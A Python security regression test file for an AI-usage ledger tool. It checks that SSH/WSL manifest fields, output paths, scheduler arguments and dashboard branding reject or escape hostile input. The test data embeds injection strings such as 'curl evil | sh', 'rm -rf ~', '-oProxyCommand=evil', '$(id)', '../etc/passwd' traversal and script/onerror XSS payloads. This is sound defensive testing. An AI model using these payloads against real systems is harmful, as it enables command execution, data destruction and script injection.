#!/usr/bin/env python3
"""
Security regression checks: operator-controlled values with shell syntax, HTML or control characters must stay
literal, and generated pages must not reach the network.

    python3 tests/test_security.py     # prints SECURITY OK on success

Covers the ClawHub audit findings for 1.5.0:
  1. report output directory with shell metacharacters -> no command runs, CSV is sorted (compile_ai_logs.py)
  2. SSH / WSL manifest fields with shell syntax -> refused before any ssh/wsl call (run_pipeline.py)
  3. scheduled wrapper: no free-form arguments, every word quoted, mode 0700 on POSIX (schedule.py)
  4. branding with markup, bad colours, remote logo, extra CSS -> escaped / dropped (build_dashboard.py, build_report.py)
  5. generated dashboard, study and documents carry a CSP and no http(s) resource references
Covers the audit findings for 1.5.1:
  6. unattended onboarding stays neutral (no publisher identity); `run` without a config refuses; presets are explicit
  7. archive: '..' and absolute paths, hostile host names and escapes outside the root are refused; ssh archive
     validates the target and drops hostile paths before any ssh call; remote commands are fixed strings
  8. private files: ledger home 0700, config / store / index / map 0600 under a permissive umask (POSIX)
"""
import json
import os
import re
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
SCRIPTS = os.path.join(ROOT, "scripts")
sys.path.insert(0, SCRIPTS)
sys.path.insert(0, HERE)
import safety  # noqa: E402
import schedule  # noqa: E402
import make_fixtures  # noqa: E402

OUT = os.path.join(HERE, "out", "security")
FX = os.path.join(HERE, "fixtures")
PY = sys.executable
EXTERNAL_REF = re.compile(r"""(?:src|href)\s*=\s*["']https?://""", re.IGNORECASE)


def run(cmd, **kw):
    return subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, encoding="utf-8", errors="replace", **kw)


def check_sort_injection():
    """--out-dir with $(...), backticks, quotes and spaces: the marker must not appear, the CSV must be sorted."""
    # no double quotes or colons: Windows cannot name a directory with them; $(), backticks, ; and spaces are enough
    weird = os.path.join(OUT, "out dir $(touch MARKER-INJECTED) `touch MARKER-INJECTED` ;x")
    os.makedirs(weird, exist_ok=True)
    markers = [os.path.join(d, "MARKER-INJECTED") for d in (ROOT, OUT, weird, os.getcwd())]
    scan = os.path.join(OUT, "scan")
    r = run([PY, os.path.join(SCRIPTS, "compile_ai_logs.py"), "scan", "--host", "fixture", "--out-dir", scan, "--claude-root", os.path.join(FX, "claude"),
             "--codex-root", os.path.join(FX, "codex"), "--aider-root", os.path.join(FX, "aider")])
    r2 = run([PY, os.path.join(SCRIPTS, "compile_ai_logs.py"), "report", "--events", os.path.join(scan, "events.fixture.jsonl"), "--pricing", os.path.join(ROOT, "templates", "pricing.json"), "--out-dir", weird])
    csvp = os.path.join(weird, "all_events.csv")
    rows = open(csvp, encoding="utf-8").read().splitlines() if os.path.isfile(csvp) else []
    ts = [ln.split(",", 1)[0] for ln in rows[1:]]
    created = any(os.path.exists(m) for m in markers)
    good = r.returncode == 0 and r2.returncode == 0 and not created and len(ts) == 6 and ts == sorted(ts)
    print("sort:      out-dir with $() and backticks -> marker %s, %d rows sorted %s  %s" % ("absent" if not created else "CREATED", len(ts), ts == sorted(ts), "OK" if good else "FAIL"))
    if not good:
        print(r.stderr[-500:], r2.stderr[-500:])
    return good


def check_manifest_validation():
    bad_hosts = [
        {"name": "s", "kind": "ssh", "ssh": "user@host", "remote_tmp": "/tmp; rm -rf ~"},
        {"name": "s", "kind": "ssh", "ssh": "user@host", "python": "python3; curl evil | sh"},
        {"name": "s", "kind": "ssh", "ssh": "-oProxyCommand=evil host"},
        {"name": "s", "kind": "ssh", "ssh": "user@host", "remote_tmp": "/tmp/../etc"},
        {"name": "s", "kind": "ssh", "ssh": "user@host", "python": "$(id)"},
    ]
    refused = 0
    for h in bad_hosts:
        try:
            safety.validate_ssh_host(h)
        except SystemExit:
            refused += 1
    ok_host = {"ssh": "completetrain@train.example.net", "remote_tmp": "/tmp/ai-usage-ledger", "python": "/usr/bin/python3"}
    accepted = safety.validate_ssh_host(ok_host) == ("completetrain@train.example.net", "/tmp/ai-usage-ledger", "/usr/bin/python3")
    wsl_refused = 0
    for h in ({"distro": "Ubuntu; evil"}, {"distro": "Ubuntu", "python": "python3 && evil"}):
        try:
            safety.validate_wsl_host(h)
        except SystemExit:
            wsl_refused += 1
    ctl = 0
    for v in ("C:\\x\ny", "/tmp/a\x00b", "-rf"):
        try:
            safety.check_path(v, "root")
        except SystemExit:
            ctl += 1
    # end to end: run_pipeline must refuse the manifest before touching ssh
    m = {"workdir": os.path.join(OUT, "pipe"), "hosts": [{"name": "evil", "kind": "ssh", "ssh": "user@host", "remote_tmp": "/tmp;touch /tmp/pwned"}]}
    mp = os.path.join(OUT, "evil-manifest.json")
    os.makedirs(os.path.dirname(mp), exist_ok=True)
    json.dump(m, open(mp, "w", encoding="utf-8"))
    r = run([PY, os.path.join(SCRIPTS, "run_pipeline.py"), "--manifest", mp, "--only", "scan"])
    e2e = r.returncode != 0 and "remote_tmp" in (r.stderr + r.stdout) and "ssh " not in r.stderr.split("remote_tmp")[0]
    good = refused == len(bad_hosts) and accepted and wsl_refused == 2 and ctl == 3 and e2e
    print("manifest:  %d/%d bad ssh hosts refused, good host accepted %s, wsl %d/2, control chars %d/3, pipeline refused before ssh %s  %s" % (refused, len(bad_hosts), accepted, wsl_refused, ctl, e2e, "OK" if good else "FAIL"))
    if not e2e:
        print(r.stderr[-400:])
    return good


def check_wrapper():
    home = os.path.join(OUT, "home with space $(touch pwned) `id`")
    os.makedirs(home, exist_ok=True)
    body = schedule.wrapper_body(home, PY, ["anonymize"])
    literal = "$(touch pwned)" in body and "--anonymize" in body
    if schedule.IS_WIN:
        quoted = '"%s"' % home in body or 'HOME=%s"' % home in body  # batch: inside double quotes; $() is literal in cmd.exe
        no_shell_eval = True
    else:
        quoted = "'" in body and "'%s'" % home.replace("'", "'\"'\"'") in body or shutil.which("sh") is None
        no_shell_eval = True
    # the CLI no longer accepts free-form arguments
    r = run([PY, os.path.join(SCRIPTS, "schedule.py"), "--home", home, "install", "--extra-args", "--x", "--dry-run"])
    no_extra = r.returncode != 0 and "extra-args" in (r.stderr + r.stdout)
    r2 = run([PY, os.path.join(SCRIPTS, "schedule.py"), "--home", home, "install", "--frequency", "daily", "--time", "03:00", "--anonymize", "--dry-run"])
    dry = r2.returncode == 0 and "will contain" in r2.stdout and not os.path.exists(os.path.join(OUT, "pwned"))
    mode_ok = True
    if not schedule.IS_WIN:
        p = schedule.write_wrapper(home, PY, ["anonymize"])
        mode_ok = (os.stat(p).st_mode & 0o777) == 0o700
    bad_time = run([PY, os.path.join(SCRIPTS, "schedule.py"), "--home", home, "install", "--time", "3pm; evil", "--dry-run"]).returncode != 0
    good = literal and quoted and no_shell_eval and no_extra and dry and mode_ok and bad_time
    print("wrapper:   metacharacters literal %s, quoted %s, --extra-args gone %s, dry-run shows body %s, mode 0700 %s, bad time refused %s  %s" % (literal, quoted, no_extra, dry, mode_ok, bad_time, "OK" if good else "FAIL"))
    if not good:
        print(body)
    return good


def check_branding_and_pages(compiled):
    evil = {"branding": {
        "name": '<script>alert(1)</script>', "eyebrow": '"><img src=x onerror=alert(2)>', "tagline": "Tag & <b>line</b>", "contact": "a@b.c",
        "footer": "</div><script>alert(3)</script>", "accent": "red;}body{display:none}", "logo": "https://evil.example/logo.png",
        "extra_css": "</style><script>alert(4)</script>", "google_fonts_url": "https://evil.example/x.css",
        "light": {"bg": "#fff", "ink": "url(javascript:alert(5))", "bad name!": "#000"}, "font_body": "Arial, sans-serif",
    }, "dashboard_title": "<script>t</script>", "html_title": "</title><script>u</script>", "theme_default": "<x>"}
    cfgp = os.path.join(OUT, "evil-config.json")
    json.dump(evil, open(cfgp, "w", encoding="utf-8"))
    dash = os.path.join(OUT, "evil-dashboard.html")
    r = run([PY, os.path.join(SCRIPTS, "build_dashboard.py"), os.path.join(compiled, "summary.json"), dash, cfgp])
    pkg = os.path.join(OUT, "evil-report")
    r2 = run([PY, os.path.join(SCRIPTS, "build_report.py"), "--compiled", compiled, "--scans", os.path.join(ROOT, "tests", "out", "pipeline", "scans"), "--pricing", os.path.join(ROOT, "templates", "pricing.json"), "--out", pkg, "--date", "2026-09-09", "--tz", "UTC", "--config", cfgp])
    results = []
    for label, path in (("dashboard", dash), ("study", os.path.join(pkg, "report.html"))):
        if not os.path.isfile(path):
            results.append((label, False, "missing"))
            continue
        h = open(path, encoding="utf-8").read()
        injected = [s for s in ("display:none}", "evil.example", "javascript:", "<script>t</script>", "<script>u</script>") if s in h]
        # alert(1) etc. may appear only in escaped form
        raw_script = re.search(r"<script>alert\(\d\)</script>", h) is not None
        raw_img = re.search(r"<img\s+src=x\s+onerror", h) is not None  # the escaped text may still contain the words; a live tag may not
        ext = EXTERNAL_REF.search(h) is not None or "fonts.googleapis" in h
        csp = "Content-Security-Policy" in h
        escaped_ok = "&lt;script&gt;alert(1)&lt;/script&gt;" in h
        good = not raw_script and not raw_img and "display:none}" not in h and "evil.example" not in h and "javascript:" not in h and not ext and csp and escaped_ok and "<script>t</script>" not in h and "<script>u</script>" not in h
        results.append((label, good, "raw_script=%s ext=%s csp=%s escaped=%s leftovers=%s" % (raw_script, ext, csp, escaped_ok, injected[:3])))
    good = all(g for _, g, _ in results) and r.returncode == 0 and r2.returncode == 0
    print("branding:  " + "; ".join("%s %s (%s)" % (lb, "ok" if g else "FAIL", d) for lb, g, d in results) + "  %s" % ("OK" if good else "FAIL"))
    if r.returncode or r2.returncode:
        print(r.stderr[-400:], r2.stderr[-400:])
    return good


def check_neutral_branding():
    import tempfile
    home = tempfile.mkdtemp(prefix="ledger-neutral-")
    env = dict(os.environ, AI_USAGE_LEDGER_HOME=home)
    ledger = os.path.join(SCRIPTS, "ledger.py")
    r0 = run([PY, ledger, "run", "--no-detect"], env=env)  # no config yet: must refuse, not onboard-and-scan
    refused = r0.returncode != 0 and "init" in (r0.stderr + r0.stdout) and not os.path.exists(os.path.join(home, "config.json"))
    r1 = run([PY, ledger, "init", "--yes", "--set", "detect.wsl=n", "--set", "detect.all_profiles=n"], env=env)
    cfg = json.load(open(os.path.join(home, "config.json"), encoding="utf-8"))
    rc = json.load(open(cfg["report_config_path"], encoding="utf-8"))
    blob = json.dumps(cfg["branding"]) + json.dumps(rc["branding"])
    neutral = r1.returncode == 0 and not cfg["branding"].get("explicit") and all(s not in blob for s in ("CompleteTech", "complete.tech", "@", "Innovation")) and "Unbranded" in json.dumps(rc["branding"])
    r2 = run([PY, ledger, "init", "--yes", "--brand-preset", "completetech"], env=env)
    cfg2 = json.load(open(os.path.join(home, "config.json"), encoding="utf-8"))
    preset = r2.returncode == 0 and cfg2["branding"].get("name") == "CompleteTech" and cfg2["branding"].get("explicit") is True and cfg2["branding"].get("preset") == "completetech"
    r3 = run([PY, ledger, "init", "--yes", "--set", "brand.preset=none", "--set", "brand.name=Acme"], env=env)
    cfg3 = json.load(open(os.path.join(home, "config.json"), encoding="utf-8"))
    explicit = r3.returncode == 0 and cfg3["branding"].get("name") == "Acme" and cfg3["branding"].get("explicit") is True and "CompleteTech" not in json.dumps(cfg3["branding"])
    bad_preset = run([PY, ledger, "init", "--yes", "--brand-preset", "nosuch"], env=env).returncode != 0
    good = refused and neutral and preset and explicit and bad_preset
    print("branding-default: run-without-config refused %s, unattended init neutral %s, explicit preset %s, explicit --set %s, unknown preset refused %s  %s" % (refused, neutral, preset, explicit, bad_preset, "OK" if good else "FAIL"))
    if not good:
        print(r0.stderr[-300:], r1.stderr[-300:], r2.stderr[-300:], blob[:300])
    shutil.rmtree(home, ignore_errors=True)
    return good


def check_archive_boundaries():
    import ledger_archive
    refused = 0
    for p in ("/a/../../etc/passwd", "../x", "C:/Users/x/../../../Windows/evil"):
        try:
            ledger_archive.rel_path(p)
        except SystemExit:
            refused += 1
    ok_rel = ledger_archive.rel_path("C:\\Users\\x\\.codex\\s.jsonl") == "C/Users/x/.codex/s.jsonl" and ledger_archive.rel_path("//wsl$/Ubuntu/home/u/.claude/a.jsonl") == "home/u/.claude/a.jsonl"
    arch = ledger_archive.Archive(os.path.join(OUT, "arch"))
    bad_host = 0
    for h in ("../evil", "h/../..", "a b", "-x", ""):
        try:
            arch.dest_for(h, "/a/b")
        except SystemExit:
            bad_host += 1
    src_refused = 0
    for p in ("/a\nb", "relative/path", "-rf", "/x/../../etc", "/a\x00b"):
        try:
            safety.check_source_path(p)
        except SystemExit:
            src_refused += 1
    dest, _ = arch._checked_dest("host-1", "/home/u/.codex/x.jsonl")
    inside = safety.contained(arch.path, dest)
    # ssh archive: the target is validated and hostile paths dropped before any ssh process starts
    import subprocess as sp
    calls = []
    real_run, real_popen = sp.run, sp.Popen

    def spy(*a, **k):
        calls.append(a[0])
        raise RuntimeError("ssh must not be called")
    sp.run, sp.Popen = spy, spy
    try:
        try:
            arch.archive_ssh("h", {"ssh": "-oProxyCommand=evil host"}, ["/srv/x.jsonl"])
            target_refused = False
        except SystemExit:
            target_refused = True
        res = arch.archive_ssh("h", {"ssh": "user@host"}, ["/srv/a\nb.jsonl", "relative.jsonl", "/srv/../etc/passwd"])
        hostile_dropped = res == (0, 0, 0) and not calls
    finally:
        sp.run, sp.Popen = real_run, real_popen
    fixed_cmds = "xargs -0" in ledger_archive.Archive.REMOTE_STAT and "--null" in ledger_archive.Archive.REMOTE_TAR
    arch.close()
    good = refused == 3 and ok_rel and bad_host == 5 and src_refused == 5 and inside and target_refused and hostile_dropped and fixed_cmds
    print("archive:   traversal refused %d/3, host names refused %d/5, source paths refused %d/5, destination contained %s, ssh target refused %s, hostile paths dropped before ssh %s, fixed remote commands %s  %s" % (
        refused, bad_host, src_refused, inside, target_refused, hostile_dropped, fixed_cmds, "OK" if good else "FAIL"))
    return good


def check_private_permissions():
    if os.name == "nt":
        print("perms:     skipped on Windows (NTFS profile ACLs; POSIX modes are checked in CI)  OK")
        return True
    import tempfile
    import anonymize
    import ledger_store
    import ledger_archive
    old = os.umask(0o022)
    try:
        home = tempfile.mkdtemp(prefix="ledger-perm-")
        os.chmod(home, 0o755)
        env = dict(os.environ, AI_USAGE_LEDGER_HOME=home)
        run([PY, os.path.join(SCRIPTS, "ledger.py"), "init", "--yes", "--set", "detect.wsl=n", "--set", "detect.all_profiles=n"], env=env)
        modes = {"home": os.stat(home).st_mode & 0o777, "config": os.stat(os.path.join(home, "config.json")).st_mode & 0o777,
                 "accounts": os.stat(os.path.join(home, "accounts.json")).st_mode & 0o777, "manifest": os.stat(os.path.join(home, "manifest.json")).st_mode & 0o777}
        st = ledger_store.Store.open("sqlite", os.path.join(home, "s.sqlite"))
        st.set_pref("k", 1)
        st.close()
        modes["sqlite"] = os.stat(os.path.join(home, "s.sqlite")).st_mode & 0o777
        fs = ledger_store.Store.open("json", os.path.join(home, "j"))
        fs.set_pref("k", 1)
        fs.close()
        modes["json-dir"] = os.stat(os.path.join(home, "j")).st_mode & 0o777
        modes["prefs"] = os.stat(os.path.join(home, "j", "prefs.json")).st_mode & 0o777
        ar = ledger_archive.Archive(os.path.join(home, "archive"))
        ar.close()
        modes["archive-dir"] = os.stat(os.path.join(home, "archive")).st_mode & 0o777
        modes["index"] = os.stat(os.path.join(home, "archive", "index.sqlite")).st_mode & 0o777
        an = anonymize.Anonymizer("salt", os.path.join(home, "map.json"))
        an.host("x")
        an.save_map()
        modes["map"] = os.stat(os.path.join(home, "map.json")).st_mode & 0o777
        # a config someone else could edit is refused
        os.chmod(os.path.join(home, "config.json"), 0o666)
        r = run([PY, os.path.join(SCRIPTS, "ledger.py"), "status"], env=env)
        shared_refused = r.returncode != 0 and "writable" in (r.stderr + r.stdout)
        os.chmod(os.path.join(home, "config.json"), 0o600)
        want = {"home": 0o700, "config": 0o600, "accounts": 0o600, "manifest": 0o600, "sqlite": 0o600, "json-dir": 0o700, "prefs": 0o600, "archive-dir": 0o700, "index": 0o600, "map": 0o600}
        bad = {k: oct(v) for k, v in modes.items() if v != want[k]}
        good = not bad and shared_refused
        print("perms:     %s under umask 022; shared config refused %s  %s" % ("all private" if not bad else "wrong: %s" % bad, shared_refused, "OK" if good else "FAIL"))
        shutil.rmtree(home, ignore_errors=True)
        return good
    finally:
        os.umask(old)


def check_examples_self_contained():
    bad = []
    for fn in ("example.html", "example-study.html"):
        p = os.path.join(ROOT, "assets", "examples", fn)
        if not os.path.isfile(p):
            continue
        h = open(p, encoding="utf-8").read()
        if EXTERNAL_REF.search(h) or "fonts.googleapis" in h or "Content-Security-Policy" not in h:
            bad.append(fn)
    good = not bad
    print("examples:  committed pages self-contained with CSP  %s%s" % ("OK" if good else "FAIL", "" if good else " " + ", ".join(bad)))
    return good


def main():
    shutil.rmtree(OUT, ignore_errors=True)
    os.makedirs(OUT, exist_ok=True)
    make_fixtures.build()
    compiled = os.path.join(ROOT, "tests", "out", "pipeline", "compiled")
    if not os.path.isfile(os.path.join(compiled, "summary.json")):
        r = run([PY, os.path.join(SCRIPTS, "run_pipeline.py"), "--manifest", os.path.join(ROOT, "examples", "manifest.fixtures.json"), "--only", "scan,report,analyze"])
        if r.returncode:
            print(r.stderr[-800:])
    ok = check_sort_injection()
    ok = check_manifest_validation() and ok
    ok = check_wrapper() and ok
    ok = check_branding_and_pages(compiled) and ok
    ok = check_examples_self_contained() and ok
    ok = check_neutral_branding() and ok
    ok = check_archive_boundaries() and ok
    ok = check_private_permissions() and ok
    print("SECURITY OK" if ok else "SECURITY CHECKS FAILED")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
